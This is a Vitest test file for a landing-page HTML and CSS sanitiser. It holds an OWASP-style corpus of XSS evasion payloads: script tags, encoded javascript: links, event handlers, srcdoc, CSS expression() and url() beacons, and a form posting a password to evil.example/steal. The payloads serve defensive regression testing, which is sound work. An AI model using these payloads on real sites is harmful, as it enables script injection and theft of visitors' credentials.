import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import {
  sanitizeLanding, sanitizeLandingHtml, sanitizeLandingCss, extractLanding, landingWarnings, urlPolicy,
  LANDING_TAGS, LANDING_TAG_ATTRS, LANDING_GLOBAL_ATTRS, LANDING_INPUT_TYPES, LANDING_AUTOCOMPLETE, LANDING_CSS_PROPERTIES, LANDING_IMG_PREFIXES,
} from "../src/sanitize";

const read = (p: string) => readFileSync(fileURLToPath(new URL(p, import.meta.url)), "utf8");
const html = (s: string) => sanitizeLandingHtml(s).html;
const allowedTags = new Set([...LANDING_TAGS.baseline, ...LANDING_TAGS.extension]);

/** Invariants every sanitised output must satisfy. */
function assertSafe(out: string) {
  expect(out).not.toMatch(/<\s*script/i);
  const outsideValues = out.replace(/"[^"]*"/g, '""');
  expect(outsideValues).not.toMatch(/\son[a-z]+\s*=/i);
  expect(outsideValues).not.toMatch(/\sformaction\s*=/i);
  const decoded = out.replace(/&#x?[0-9a-f]+;?/gi, "").toLowerCase();
  expect(decoded).not.toMatch(/javascript:|vbscript:|data:text/);
  for (const m of out.matchAll(/<\s*([a-z0-9-]+)/gi)) expect(allowedTags.has(m[1].toLowerCase()), `tag ${m[1]}`).toBe(true);
  for (const m of out.matchAll(/\s(href|src|action)="([^"]*)"/gi)) {
    const [, a, v] = m;
    if (a === "src") expect(LANDING_IMG_PREFIXES.some((p) => v.startsWith(p))).toBe(true);
    else expect(v).toMatch(/^(#l-|\/(?!\/)|https:\/\/|mailto:|tel:)/);
  }
  for (const m of out.matchAll(/\sid="([^"]*)"/g)) expect(m[1]).toMatch(/^l-/);
}

// OWASP filter-evasion style corpus (abridged) plus site-specific cases.
const CORPUS = [
  "<script>alert(1)</script>", "<SCRIPT SRC=//x.js></SCRIPT>", "<scr<script>ipt>alert(1)</script>", "<img src=x onerror=alert(1)>",
  "<img src=/assets/a.jpg onerror='alert(1)'>", '<a href="javascript:alert(1)">x</a>', '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>', '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>', '<a href="jav\nascript:alert(1)">x</a>', '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>', '<a href="//evil.example/">x</a>', '<a href="\\\\evil.example">x</a>',
  '<a href="http://evil.example">x</a>', '<a href="/\\evil.example">x</a>', "<svg onload=alert(1)><circle/></svg>",
  "<svg><script>alert(1)</script></svg>", "<math><mtext><script>alert(1)</script></mtext></math>", '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="https://evil.example/">', '<object data="x.swf"></object>', '<embed src="x.swf">',
  '<form action="https://evil.example/steal"><input type="password" name="p"></form>', '<button formaction="javascript:alert(1)">x</button>',
  '<input type="file"><input type="hidden" name="x" value="y"><input autocomplete="cc-number">', '<img src="https://tracker.example/p.gif">',
  '<img src="data:image/png;base64,AAAA">', '<img src="/assets/../secrets">', '<div style="background:url(https://evil.example/x)">x</div>',
  '<div style="width:expression(alert(1))">x</div>', '<div style="position:fixed;inset:0;z-index:9999">x</div>', '<div id="main" class="x">x</div>',
  '<p>text</p><!-- <script>alert(1)</script> -->', '<div data-x="1" role="dialog" hidden>x</div>', '<a href="#step 1">x</a>',
  '<a title="&quot; onmouseover=alert(1) x=&quot;">x</a>', "<div><p>unclosed <b>tags",
];

describe("landing HTML sanitiser", () => {
  it.each(CORPUS)("neutralises %s", (payload) => assertSafe(html(payload)));
  it("keeps legitimate markup and namespaces ids and fragments", () => {
    expect(html('<form action="#step1" method="get"><label for="name">Name</label><input id="name" type="text" required=""><button type="submit">Go</button></form>'))
      .toBe('<form action="#l-step1" method="get"><label for="l-name">Name</label><input id="l-name" type="text" required><button type="submit">Go</button></form>');
    expect(html('<a href="https://www.juliebale.com/discoversinging">x</a>')).toBe('<a href="https://www.juliebale.com/discoversinging">x</a>');
    expect(html('<img src="/assets/julie-portrait.jpeg" alt="Julie" loading="lazy">')).toBe('<img src="/assets/julie-portrait.jpeg" alt="Julie" loading="lazy">');
    expect(html('<p lang="en-GB" style="color:#e6bf72">Hi</p>')).toBe('<p lang="en-GB" style="color: #e6bf72">Hi</p>');
  });
  it("rejects protocol-relative, backslash and http URLs explicitly", () => {
    for (const bad of ["//evil.example", "/\\evil", "http://x.example", "https:\\\\x", "ftp://x", "https://x .example"]) expect(urlPolicy.link(bad)).toBeNull();
    expect(urlPolicy.link("/about?x=1#y")).toBe("/about?x=1#y");
    expect(urlPolicy.image("/media/a/b.jpg")).toBe("/media/a/b.jpg");
    expect(urlPolicy.image("/other/b.jpg")).toBeNull();
    expect(urlPolicy.formAction("https://evil.example/x")).toBeNull();
  });
  it("gives generic, capped notes that never echo payloads", () => {
    const { notes } = sanitizeLanding(`<main>${CORPUS.join("")}</main>`);
    expect(notes.length).toBeLessThanOrEqual(30);
    expect(notes.join(" ")).not.toMatch(/alert|evil|base64|expression/);
  });
  it("fails closed and handles odd input", () => {
    expect(sanitizeLanding(undefined)).toMatchObject({ css: "", body: "" });
    const big = "<p>x</p>".repeat(130000);
    const t = Date.now();
    expect(sanitizeLanding(big).body.length).toBeGreaterThan(0);
    expect(Date.now() - t).toBeLessThan(3000);
  });
});

describe("landing CSS sanitiser", () => {
  const css = (s: string) => sanitizeLandingCss(s).css;
  it("scopes every selector under .landing and namespaces ids", () => {
    expect(css(":root{--gold:#b0a} body{margin:0} * {box-sizing:border-box} .nav a:hover, #step1{color:red}"))
      .toBe(".landing { --gold: #b0a; }\n.landing { margin: 0; }\n.landing * { box-sizing: border-box; }\n.landing .nav a:hover, .landing #l-step1 { color: red; }");
    expect(css("@media(max-width:800px){.hero{padding:1rem}}")).toBe("@media(max-width:800px) { .landing .hero { padding: 1rem; } }");
  });
  it.each([
    "a{background:url(https://evil.example/?)}", "a{background:image-set('x.png' 1x)}", "a{width:expression(alert(1))}", "a{color:red;} @import url(x.css);",
    "@font-face{font-family:x;src:url(x.woff)}", "a{background:\\75 rl(x)}", "a{position:fixed}", "a{z-index:9999}", "a{z-index:21}", "a{-moz-binding:url(x)}",
    "a{behavior:url(x.htc)}", "</style><script>alert(1)</script>", "a[href^=a]{background:url(//x/?a)}", "a{content:'<'}", "a{color:red}}{}body{x:y",
  ])("drops dangerous CSS: %s", (payload) => {
    const out = css(payload);
    expect(out).not.toMatch(/url\(|image-set|expression|@import|@font-face|\\|fixed|9999|z-index: 21|binding|behavior|<|script/i);
    for (const line of out.split("\n").filter((l) => l && !l.startsWith("@media"))) expect(line.startsWith(".landing")).toBe(true);
  });
});

describe("the real landing page still works", () => {
  const src = read("fixtures/landing-audit.html");
  const { css: origCss, body: origBody } = extractLanding(src);
  const out = sanitizeLanding(src);
  const text = (h: string) => h.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ").trim();
  const count = (h: string, tag: string) => (h.match(new RegExp(`<${tag}\\b`, "gi")) || []).length;
  it("keeps all text, controls and links (with namespaced fragments)", () => {
    expect(out.notes).toEqual([]);
    expect(text(out.body)).toBe(text(origBody));
    for (const tag of ["a", "form", "input", "label", "button", "section", "p", "h3"]) expect(count(out.body, tag), tag).toBe(count(origBody, tag));
    const hrefs = (h: string) => [...h.matchAll(/href="([^"]*)"/g)].map((m) => m[1]);
    expect(hrefs(out.body)).toEqual(hrefs(origBody).map((h) => (h.startsWith("#") ? `#l-${h.slice(1)}` : h)));
  });
  it("keeps every CSS declaration, now scoped (so .nav/.section no longer style the site)", () => {
    const decls = (c: string) => (c.match(/[a-z-]+\s*:\s*[^;{}]+/g) || []).length;
    expect(decls(out.css)).toBe(decls(origCss.join("\n")));
    expect(out.css).not.toMatch(/(^|\n|,\s*)\.(nav|section|eyebrow)\b/);
    expect(out.css).toMatch(/\.landing \.nav/);
  });
});

describe("assistant docs cover the whole landing policy", () => {
  const doc = read("../context/content-model.md");
  const section = doc.slice(doc.indexOf("## Landing pages"));
  it("lists every allowed tag, attribute, input type, autocomplete value, CSS property and image prefix", () => {
    const all = [...LANDING_TAGS.baseline, ...LANDING_TAGS.extension, ...LANDING_GLOBAL_ATTRS, ...Object.values(LANDING_TAG_ATTRS).flat(),
      ...LANDING_INPUT_TYPES, ...LANDING_AUTOCOMPLETE, ...LANDING_CSS_PROPERTIES.baseline, ...LANDING_CSS_PROPERTIES.extension, ...LANDING_IMG_PREFIXES];
    for (const x of new Set(all)) expect(section, x).toContain(`\`${x}\``);
  });
  it("explains URL rules, id namespacing, scoping and alternatives", () => {
    for (const phrase of ["https:", "mailto:", "tel:", "`l-`", "`.landing`", "`media` block", "request a feature", "`@media`", "url()"]) expect(section).toContain(phrase);
  });
});

describe("write warnings", () => {
  it("are produced for landing documents", () => {
    expect(landingWarnings({ html: "<main><script>x</script><p onclick='x'>Hi</p></main>" })).toEqual([
      "landing: removed <script> element.", "landing: removed an event-handler attribute from <p>.",
    ]);
    expect(landingWarnings({})).toEqual(["landing pages need an html field (a string)."]);
  });
});

describe("landing pages honour reduced motion", () => {
  it("the site stylesheet turns off landing transitions for reduced-motion visitors", () => {
    const css = read("../public/styles.css");
    expect(css).toMatch(/@media \(prefers-reduced-motion: reduce\) \{[\s\S]*?\.landing \*, \.landing \*::before, \.landing \*::after \{ transition: none !important;/);
  });
  it("authors may also write their own reduced-motion @media block", () => {
    expect(sanitizeLandingCss("@media (prefers-reduced-motion: reduce){.btn{transition:none}}").css).toBe("@media (prefers-reduced-motion: reduce) { .landing .btn { transition: none; } }");
  });
});

describe("landing stacking", () => {
  it("landing content has its own stacking context and z-index is capped at 20", () => {
    expect(read("../public/styles.css")).toMatch(/\.landing \{ position: relative; isolation: isolate; \}/);
    expect(sanitizeLandingCss("a{z-index:20} b{z-index:21}").css).toBe(".landing a { z-index: 20; }");
  });
});


describe("disallowed tags are stripped and noted (Sprint 17 regression)", () => {
  it("keeps the text of a disallowed tag and records a note for it", () => {
    const r = sanitizeLandingHtml("<p><b>bold</b> and <marquee>moving</marquee></p>");
    expect(r.html).toBe("<p>bold and moving</p>");
    expect(r.notes).toEqual(["removed <b> element", "removed <marquee> element"]);
  });
});
